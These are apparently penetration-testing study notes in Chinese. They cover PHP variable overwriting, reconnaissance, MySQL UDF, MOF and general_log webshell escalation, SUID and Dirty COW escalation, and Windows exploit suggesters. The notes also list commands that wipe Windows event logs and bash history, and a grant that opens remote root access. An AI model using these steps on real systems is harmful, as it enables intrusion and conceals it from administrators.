md5（）当参数为数组时，返回null

json\_decode（）、array\_search（）、switch循环

变量覆盖：

配置文件：

register\_globals（）为ON时，传递的变量会自动被注册为全局变量

php5.2版本默认为on

php5.3版本默认为off

php5.4版本默认取消了

$$同时出现，导致变量覆盖的问题

extract（）函数：从数组中将变量导入到当前的符号表中，导入的形式与第二个参数相关

例如：$aa=\['a'=>123,'b'=>456\] extract（$aa) 此时$a=123,$b=456

parse\_str（）函数：将字符串解析成多个变量，如果传递了第二个参数，值会被保存在第三个参数中

import\_request\_variables（）：该函数可以将register\_global为off时，将传入的参数注册为全局变量（PHP 4 >=4.1.0 , PHP 5 < 5.4.0)，如果几种传值方式同时存在，则以参数排序为准，后面的覆盖前面的

**渗透测试流程**

准备工作：

确认范围：测试目标的范围，ip、域名、内外网

确认规则：能够渗透到上面程度，时间，能否提权等

确认需求：web应用漏洞？业务逻辑漏洞？人员权限管理漏洞？等等

信息收集：

①：利用kali集成的 whois 功能查询，域名注册者的姓名，邮箱等相关信息。

使用方式 ：whois + 域名 例如 ：whois bihuo.cn

②：子域名收集、旁站查询、C段查询等（在授权的情况下可以进行渗透)

子域名收集工具：oneforall 、subDomainsBrute 、layer

在线网站：[同IP网站查询,C段查询,IP反查域名,在线C段,旁站工具 - WebScan](https://www.webscan.cc/ "同IP网站查询,C段查询,IP反查域名,在线C段,旁站工具 - WebScan")

[URL and website scanner - urlscan.io](https://urlscan.io/ "URL and website scanner - urlscan.io")

[子域名查询 - 站长工具](http://tool.chinaz.com/subdomain "子域名查询 - 站长工具")

[DNSdumpster.com - dns recon and research, find and lookup dns records](https://dnsdumpster.com/ "DNSdumpster.com - dns recon and research, find and lookup dns records")

 https://spyse.com/target/domain/sina.com/subdomain-list

[ViewDNS.info - Your one source for DNS related tools!](https://viewdns.info/ "ViewDNS.info - Your one source for DNS related tools!")

[在线子域名查询](https://phpinfo.me/domain "在线子域名查询")

[123.56.4.112属于北京北京 阿里云\_IP反查域名\_同IP站点查询\_同ip网站查询\_爱站网](http://dns.aizhan.com/ "123.56.4.112属于北京北京 阿里云_IP反查域名_同IP站点查询_同ip网站查询_爱站网")

 securityTrails平台

[首页 - 微步在线威胁情报社区](https://x.threatbook.cn/partner "首页 - 微步在线威胁情报社区") 微步交流平台

[安全指数](https://ce.baidu.com/index/getRelatedSites?site_address= "安全指数")

③：服务器的相关信息（真实ip、系统类型、版本、开放端口、WAF等）

利用wafw00f 获取waf信息

利用Nmap探测、masscan探测获取系统类型，版本，及端口信息等

真实ip ： 通过内部邮箱源，查看内部邮箱服务器ip地址

通过网站存在的漏洞和泄露的敏感信息，如：phpinfo文件，网站原码文件等

分站ip（cdn较贵，分站可能没有使用cdn，而分站ip很可能与主站处于同一C段中，以此来判断主站的真实ip）

查询历史DNS记录（通过历史DNS解析，分析那些ip不在现在的cdn解析ip中，就很可能是之前没有使用cdn加速的真实ip）

使用国外主机解析域名，部分国内的cdn加速服务商只对国内的线路做了cdn加速，但是对国外的线路没有做加速，就可以利用国外的主机来探测真实的ip信息。也可利用某些服务网站进行多ping，根据探测节点返回的信息来判断真实的ip信息

利用SSL证书信息，获取真实ip

④：网站CMS指纹识别

[在线指纹识别,在线cms识别小插件--在线工具](http://whatweb.bugscaner.com/look/ "在线指纹识别,在线cms识别小插件--在线工具")

[yunsee.cn-2.0](http://www.yunsee.cn/finger.html "yunsee.cn-2.0")

[web指纹识别|CMS指纹识别|在线指纹识别|在线CMS指纹识别 -GoeEye平台](https://www.godeye.vip/index/ "web指纹识别|CMS指纹识别|在线指纹识别|在线CMS指纹识别 -GoeEye平台")

[https://sso.tidesec.com/index.php?m=index&a=nav](https://sso.tidesec.com/index.php?m=index&a=nav "https://sso.tidesec.com/index.php?m=index&a=nav")

Whatweb 工具 （针对于扫描小网站）

通过对网站的特定图片、js文件、css等静态文件，通过爬虫对这些文件进行抓取并比对md5值，同时和规则库中的作比较，以此来判断cms类型

⑤：扫描网站目录结构，爆后台，网站banner，测试文件，备份等敏感文件泄露等

利用Robots.txt文件，该文件可能会导致敏感文件名泄露的风险

利用御剑、7kbscan、dirb、dirbuster等工具去扫描目标后台，及敏感文件

⑥：Google hacking针对化搜索，PDF文件，中间件版本，弱口令扫描等

常用语法：

Intitle ： 以网页标题中关键字搜索

Inurl ：从url中存在的关键字进行搜索匹配

Intext ：以网页正文中的关键字进行搜索

Filetype ：搜索指定的文件后缀

Site ：指定域名

⑦：利用FOFA等搜索引擎收集相关资产信息

直接利用：

对于查询的服务器系统版本，web中间件，查看是否存在已知漏洞。

漏洞挖掘：

前提：在授权的情况下

①：浏览网站、查看网站规模、功能、特定等

②：对网站进行漏洞探测、挖掘常见web漏洞（例如：sql注入、xss、文件包含、逻辑漏洞等）

③：在漏洞挖掘过程中利用漏洞扫描工具AWVS、xray、Nessus、sqlmap、burpsuite等工具，加快对于内外网漏洞的扫描及验证，以便节省自身时间。

漏洞利用|权限提升：

利用存在的漏洞，尽可能的获取webshell，配合msf去提升和维持当前权限

Windows提权、MySQL提权、Linux提权等

痕迹清理|总结报告：

清理日志文件，测试数据等

 windows：

有远程桌面权限时手动删除日志

开始-程序-管理工具-计算机管理-系统管理-事件查看器-清除日志

wevtutil el 列出系统中所有日志名称 wevtutil cl system 清理系统日志 wevtutil cl application 清理应用程序日志 wevtutil cl security 清理安全日志

meterperter自带清除日志功能：

clearev 清除windows中的应用程序日志、系统日志、安全日志

Linux：

histroy -r #删除当前会话历史记录 history -c #删除内存中的所有命令历史 rm .bash\_history #删除历史文件中的内容 HISTZISE=0 #通过设置历史命令条数来清除所有历史记录

Linux日志文件：

/var/run/utmp 记录现在登入的用户 /var/log/wtmp 记录用户所有的登入和登出 /var/log/lastlog 记录每一个用户最后登入时间 /var/log/btmp 记录错误的登入尝试 /var/log/auth.log 需要身份确认的操作 /var/log/secure 记录安全相关的日志信息 /var/log/maillog 记录邮件相关的日志信息 /var/log/message 记录系统启动后的信息和错误日志 /var/log/cron 记录定时任务相关的日志信息 /var/log/spooler 记录UUCP和news设备相关的日志信息 /var/log/boot.log 记录守护进程启动和停止相关的日志消息

整理渗透工具：渗透过程中使用到的代码、poc、exp等

整理信息收集：整理渗透过程中收集的一切信息。

整理漏洞信息：整理渗透过程中遇到的各种漏洞，各种脆弱位置信息

根据客户确定好的范围，整理资料，并将资料形成报告，对漏洞成因、验证过程和危害进行分析，提出修补建议。

### 提权：

mysql提权：

前提：

可能已经具有一个较低的权限、能够对某些文件具有读写操作

使用 show variables like '%secure%'；查看 SECURE\_FILE\_PRIV 的配置信息

如果为null 代表则我们无法进行读和写的操作，所有不能为 null

尝试获取root权限：

尝试读取放置用户密码的文件（可以使用 select @@basedir 查看，通常为：C:/phpStudy/MySQL/data/mysql 下的3个user文件）

因为直接读取可能会导致乱码，所有可以将文件下载下来，新建一个数据库，将其放置到指定位置，从而读取其中的账户密码信息。

如果其中存在着真实的用户信息，我们便可以成功的获取到root权限

创建用户： Grant all privileges on \*.\* to 'root'@'%' identified by 'root' with grant option;

udf提取：

利用MySQL的自定义函数功能，将MySQL账号转化为系统system权限

条件：

secure-file-priv 不为null

MySQL版本大于5.1时,udf.dll文件必须放置于MySQL安装目录下的 lib\\plugin文件夹

下，可以使用 show VARIABLES like '%plugin%'; 查看目录

MySQL版本小于5.1时,udf.dll文件在Windows2003下放置于c:\\windows\\system32,

在windows2000下放置于c:\\winnt\\system32

步骤：

选择数据库：use 库名；

将准备好的脚本以16进制形式赋值给一个变量：set@a=concat（‘’，十六进制文本）

创建表，添加一个字段，字段类型为longblob（以二进制形式存储数据）

将变量的值存储到数据表中

读取表中的数据，以二进制的形式将数据存储到特定的文件下（plugin目录下）

使用create function 从生成的dll文件中，读取backshell函数，给函数添加回连的ip和端口

（类似于反弹shell）

（如果直接执行命令可以文件中的cmdshell函数，并将执行的结果使用文件另存为就可以得到执行命令的结果）

脚本提权：

上传恶意脚本文件，可以无需第三方管理工具（例如：蚁剑等）

Mof提权：

利用了 c:/windows/system32/wbem/mof/目录下的nullevt.mof文件,MOF文件每5秒会被执行一次,而且使用的是系统权限，执行成功放置到good目录下，失败为bad目录下

条件：

Windows 03 及以下版本

secure-file-priv !=null （不做设置）

有权限去读写c:/windows/system32/wbem/mof目录下的文件

步骤：

多数情况下，我们无法直接对该目录直接进行操作，可以采用读取然后在往该目录下写入

vbs提权：

利用系统开机自启时会自动执行相关文件下的内容，此时如果我们提前将构造好的脚本文件（可以去网上查找相关的脚本文件）放置到该目录下，那么在系统开机时就会被自动执行

条件：

具备可以往特定目录下(启动项目录)读和写的权限

难点：

英文系统路径中存在空格

中文系统路径中存在中文(容易乱码)

常见不同系统下的开机文件位置：

\# 中文系统 C:\\Documents and Settings\\Administrator\\「开始」菜单\\程序\\启动 C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动

\# 英文系统 C:\\Documents and Settings\\Administrator\\Start Menu\\Programs\\Startup C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup

\# 开关机项 需要自己建立对应文件夹 C:\\WINDOWS\\system32\\GroupPolicy\\Machine\\Scripts\\Startup C:\\WINDOWS\\system32\\GroupPolicy\\Machine\\Scripts\\Shutdown

PHPmyadmin提权：

通过日志,传入构造的PHP语句,从而访问日志文件

获取webshell管理权限(执行system命令)

条件：

具备数据库操作的root权限

通过设置 set general\_log 来控制书写日志的位置,从而访问日志文件

使用 show VARIABLES like '%general%'; 查看配置的状态

提权方式：

通用日志（快查询日志）执行的语句能被快速执行并获取结果

修改日志记录状态：set GLOBAL general\_log = 'On'; （开启后，我们所执行的语句会被记录到日志文件中）

修改存储路径：set GLOBAL general\_log\_file =‘自定义路径’；

此时访问含有特定语句的日志文件，我们便可以成功getshell

慢查询日志（执行的语句经过一定的时间才执行出结果）

修改状态: set GLOBAL show\_query\_log = 'On';

修改路径: set GLOBAL show\_query\_log\_file = '自定义路径';

（构造语句时，我们可以加入sleep（），这样就可以成功的达到慢执行的效果）

sql server提权:

沙盒提权 差异备份 xp\_cmdshell sp\_oacreate sethc.exe替换

Linux提权：

已经拥有一定的权限

利用脚本提权：

脚本下载地址：

[https://github.com/mzet-/linux-exploit-suggester.git](https://github.com/mzet-/linux-exploit-suggester.git "https://github.com/mzet-/linux-exploit-suggester.git")

提权辅助网站：

[https://github.com/SecWiki/linux-kernel-exploits](https://github.com/SecWiki/linux-kernel-exploits "https://github.com/SecWiki/linux-kernel-exploits")

（可以直接查找对应时间对应版本，可利用的payload）

步骤：

下载一个 linux-exploit-suggester-master的脚本文件

（通常在执行脚本文件之前，我们会手动去添加一个可执行权限：chmod +x 脚本文件名

运行该脚本，会枚举出一些可用来提权的漏洞，并提供下载地址（基于补丁的扫描）

下载对应的执行文件，并执行（可能某写情况下无法直接提权成功）（uname -a 查看版本信息）

错误配置提权：

辅助网站：[https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum "https://github.com/rebootuser/LinEnum")

LinEnum是一款Linux文件枚举及权限提升的检查工具，可以帮助渗透测试人员对linux系统漏洞或安全问题进行一键式体验

（将下载的压缩包解压到要检测的主机上，选择参数直接进行扫描）

多数 linux 系统的密码都和/etc/passwd和/etc/shadow这两个配置文件息息相关，passwd存储用户信息，shadow存储密码的hash值

如果由于管理员误操作,此时导致普通用户对于passwd文件具有写的权限,那么此时便可以直接修改/etc/passwd文件中root用户的密码项,这样的话系统验证密码时,便会以/etc/passwd里面的内容为准.

用户名 : 密码 : UID : GID : 用户名全面/本账户 : 根目录 : 登录之后使用的终端命令

最后只有为 /bin/bash 或者/bin/sh 才能准许登录

添加用户：useradd 用户名

设置密码：passwd 用户名

密码复用提权：

类似于弱密码,一个密码多次使用(例如:配置文件中的密码就可能为root密码)

sudo滥用提权：

辅助网站：

[GTFOBins](https://gtfobins.github.io/ "GTFOBins")

sudo : 当前用户能以特定的身份(root)去执行那些特定的命令,并且需要验证当前用户的密码

sudo -l 该指令可以查看**当前用户**有哪些命令可以以特定的权限(root) 执行,只需要验证自身(例如:kali)的密码即可

配置信息：

sudo 是用来提权的命令,当执行权限不够时,可以使用sudo命令来提升权限,其配置文件是 /etc/sudoers

此时可以看到,在kali用户下,无法查看ip信息,此时就可以使用sudo来提升权限,并且只需要验证自身( kali )的身份 (此时可以理解为当前用户kali以root管理员的权限去执行该命令)

格式: 用户名 网络中的主机 = (执行命令的目标用户) 执行命令的范围

如果此时想要修改kali利用sudo可执行的命令范围,此时需要传入命令的执行文件路径,且将sudo注释

awk实例：

利用辅助网站，查询相关的语句，执行特定语句后，有机会成功实现提权

利用端口反弹shell

利用awk去读取任意文件或者写入文件

利用计划任务提权：

linux 系统中有一些定时执行的任务,一般这些任务由crontab来管理,具有所属用户的权限.非root权限的用户时不可以列出root用户的计划任务的,但是/etc/内系统的计划任务可以被列出（etc/crontab )

如果说这些以管理员权限定期执行的文件,其中有一个脚本为任意用户可以写,那么我们则可以修改该脚本,从而到达使用管理员身份执行的效果

例如: 如果管理员制定了一个定时执行/tmp 目录下的某个脚本

但是因为/tmp 目录所有的用户都可以访问,那么此时我们就可以自己主动构建脚本,从而定时让其使用管理员权限去执行(如果执行的是写入一个文件的话,路径使用的是./ 那么会存储在root目录下,因为是root用户执行的)

也可以上传一个脚本,利用定时任务执行该脚本,从而向某一主机的某一端口反弹一个shell

suid提权：

是赋予文件一种特殊的权限,具有这种权限的文件会在其执行时,使调用者暂时获得该文件拥有者的权限

语句可参考辅助网站：[GTFOBins](https://gtfobins.github.io/ "GTFOBins")

列出有suid权限的文件：

find / -user root -perm -4000 -print 2>/dev/null

find / -perm -u=s -type f 2>/dev/null

find实例：

touch bihuo.cn ; 创建一个文件

find bihuo.cn -exec whoami \\; 执行命令

例如: 此时我们的 find 命令拥有错误的配置,拥有了suid权限

此时可以看到,当find指令具有suid权限时,执行特殊的语句时便可以使用root权限去访问本访问不到的文件

或者使用该指定同样可以获得root权限

脏牛提权：

大于2.6.22版本 （2007年发行，到2016年10月18日修复）

低权限的用户可利用这一漏洞在本地进行提权

原理：

Linux内核的子系统在处理写入时，复制至产生了竞争条件，恶意用户可利用此漏洞来获取高权限，对只读内存映射进行访问

竞争条件:指的是任务执行顺序异常，可导致应用奔溃，或令攻击者有机可乘，进一步执行其他代码，利用这一漏洞，攻击者可在其目标系统提升权限，甚至可能获取到root权限

利用相关脚本（dirty.c提取脚本）

命令：gcc -pthread dirty.c -o dirty -lcrypt

执行完之后，会在当前目录下生成一个dirty的文件

给该文件添加执行权限：chmod +x dirty文件

执行该文件：文件名 新用户的密码 （默认会创建一个firefart用户）

此时可以看到，低限用户成功的往用户管理文件中接入一个具有root组权限的firefart的用户

Windows提权：

系统内核溢出漏洞提权、数据库提权、错误的系统配置提权、组策略首选项提权、WEB中间件漏洞提权、DLL劫持提权、滥用高危权限令牌提权、第三方软件/服务提权等

系统内核溢出漏洞提权

此提权方法即是通过系统本身存在的一些漏洞，未曾打相应的补丁而暴露出来的提权方法，依托可以提升权限的EXP和它们的补丁编号，进行提升权限。

系统配置错误提权

系统服务权限配置错误

Windows在系统启动时，会伴随着一些高权服务启动，倘若某些服务存在一些漏洞，那么就能够借此服务进行权限劫持

可信任服务路径漏洞

如果一个服务的可执行文件的路径没有被双引号引起来且包含空格，那么这个服务就是有漏洞的

计划任务

如果攻击者对以高权限运行的任务所在的目录具有写权限，就可以使用恶意程序覆盖原来的程序，这样在下次计划执行时，就会以高权限来运行恶意程序。

组策略首选项提权

组策略首选项(Group Policy Preferences,GPP)

绕过UAC提权

无凭证条件下的权限提升

远程登录：

如果目标主机开启了远程登录（rdp），可以尝试链接

也可以尝试爆破

win +R 输入 mstsc （远程登录面板）

辅助工具提权：

条件：

获取目标主机 systeminfo 信息

辅助网站：

[https://github.com/klsfct/getshell](https://github.com/klsfct/getshell "https://github.com/klsfct/getshell")

[https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits "https://github.com/SecWiki/windows-kernel-exploits")

步骤：

Windows exploit-suggester 是一款提权辅助工具

Linux主机辅助环境搭建：

curl [https://bootstrap.pypa.io/pip/2.7/get-pip.py](https://bootstrap.pypa.io/pip/2.7/get-pip.py "https://bootstrap.pypa.io/pip/2.7/get-pip.py") -o get-pip.py 下载安装脚本（当前目录下会生成一个get-pip.py的文件）

sudo python get-pip.py （运行安装脚本，默认为python2）

pip --trusted-host pypi.python.org install xlrd == 1.2.0（下载安装xlrd插件（依赖库）也可以选择版本 xlrd == 1.2.0）

windows-exploit-suggester.py --update（在脚本目录下运行：获取对应漏洞信息库）

windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt （执行命令，需要指明生成的漏洞信息表，和目标主机systeminfo文件）

执行完之后，会枚举出可能存在的漏洞，此时去辅助网站下载对应的payload，在目标主机上运行下载的payload进行提权

或者使用 wesng-master提权（与windows-exploit-suggester.py功能类似（特定就是漏洞较新，但是可能老的漏洞没有记录））

使用方式：在辅助主机上解压后使用wes.py -update 更新数据库 将目标主机的systeminfo数据导出到辅助主机 执行 python3 wes.py systeminfo.txt （会自动枚举出相关漏洞）（支持python3和python2） payload推荐去辅助网站下载

[查看原网页: t.csdn.cn](http://t.csdn.cn/wBgcv)